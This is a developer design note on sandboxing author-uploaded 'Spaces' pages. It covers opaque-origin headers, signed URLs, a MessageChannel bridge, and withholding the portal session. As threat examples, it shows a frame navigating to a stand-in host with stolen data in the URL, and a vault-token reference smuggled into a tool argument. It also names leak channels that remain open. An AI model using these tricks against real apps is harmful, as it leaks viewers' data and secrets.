# Spaces: the bridge between a sandboxed page and the viewer's tools

**Date:** 2026-11-07

Spaces (`src/spaces/`, spec in `docs/superpowers/specs/2026-11-07-spaces-design.md`)
run author-uploaded pages that call integrations as whoever opens them. Four
things were not obvious.

## 1. An opaque-origin document needs `Cross-Origin-Resource-Policy: cross-origin`

The page is served with `Content-Security-Policy: sandbox allow-scripts` and
framed with `sandbox="allow-scripts allow-forms"`, so its origin is opaque
(`null`). Every subresource it loads, including its own `<script src="./app.js">`,
its CSS, its images and `/s/_sdk/workbench.js`, is therefore a cross-origin
no-cors request, even though the URL is on the same host. Jots send
`CORP: same-origin`, and that would block all of them. Spaces send
`cross-origin`; the HMAC `sig` in the path (`/s/<name>/app/<sig>/`) is the
access control, not the origin.

Related: `'self'` in a CSP inside an opaque-origin document is not matched
consistently by browsers, so the policy spells the origins out next to it.
Both of them: the server's (`SERVER_PUBLIC_URL`) and the portal's
(`PORTAL_URL`). The portal frames the page, so `frame-ancestors` needs its
origin, and the relative `appUrl` and `/s/_sdk/workbench.js` are fetched
through the portal origin (the Vite dev server on another port, or any split
deployment), so every source list needs it too. With the server origin alone
the frame is refused outright in dev.

The iframe sends no cookie or bearer, so the serve route cannot know the
viewer from the request. The spec's MAC binds the viewer id, so the id travels
inside the sig (`base64url(exp).base64url(userId).base64url(mac)`). That
makes its length depend on the user id, and find-my-way caps a `:param` at
100 characters (beyond it the router answers 414). So the route is
`/s/:name/app/*` and the sig is the first segment of the wildcard tail, which
has no such cap. The same limit is why the per-viewer KV routes take the key
as a wildcard tail (`/api/spaces/:name/kv/*`): keys may be up to 128
characters.

## 2. `MessageChannel`, not `contentWindow`, after the handshake

A sandboxed frame can navigate itself (`location = "https://elsewhere/?" + data`)
and no shipped CSP directive prevents it. The new document lives in the same
`iframe.contentWindow`. A shell that kept posting replies to `contentWindow`
would hand in-flight results to whatever document is there now, and would take
requests from it.

So `contentWindow` is used exactly once: on the frame's first `load`, the shell
posts `{ __wb: 1, type: "port" }` with `port2` of a fresh `MessageChannel`
(target origin `"*"`, because the frame's origin is opaque and cannot be
named). Every request and reply after that goes over the port. A navigated
document never receives a port, so it can neither call tools nor read replies.
The SDK accepts the port only when `event.source === window.parent`, and only
once, so another frame cannot plant its own port first. Calls made before the
port arrives are queued, not dropped. A second `load` event means the frame
navigated; the shell unmounts it.

What still leaks: data placed in the navigation URL itself, and DNS prefetch,
which CSP does not govern. Spaces are exfiltration-resistant, not
exfiltration-proof.

## 3. Vault references must not cross the bridge

`executeSingle` resolves `{{vault:NAME}}` in tool arguments unless it is handed
a pre-substituted map. A Space could otherwise write
`{ body: "{{vault:prod_token}}" }` into a comment tool and post the viewer's
secret to a place the author can read. `/api/spaces/:name/call` does both: it
refuses any argument string or object key containing `{{vault:` with
`INVALID_ARGS`, and it calls `executeSingle(viewerId, tool, args, new Map())`,
whose empty but present map means "already substituted, resolve nothing". The
refusal makes the failure loud; the empty map makes it safe even if the scan
missed a spelling.

## 4. Why the Space does not get the portal session

The portal session JWT can do anything the viewer can: every tool, the vault,
API-key minting, and `/api/admin/*` for an admin. Any signed-in user can upload
a Space. Handing the page the session (or putting it same-origin with the
portal) would make the declared tool list and the consent screen advisory.
Instead the page is opaque-origin and credential-less, and the shell, which
holds the session, forwards only the bridge's narrow requests to
`/api/spaces/:name/*`. Those routes accept the portal session only (an agent's
API key or OAuth token gets 401), so "a human in the shell" is the only way to
drive a Space, and the server re-checks access, consent, the declared list and
the effect on every call. Destructive-call confirmation also needs UI the page
cannot draw over or click, which only exists outside the iframe.

Calls are audited with `client_name = "space:<name>"` (an override on the
request's audit context), so the Activity page shows which Space acted.
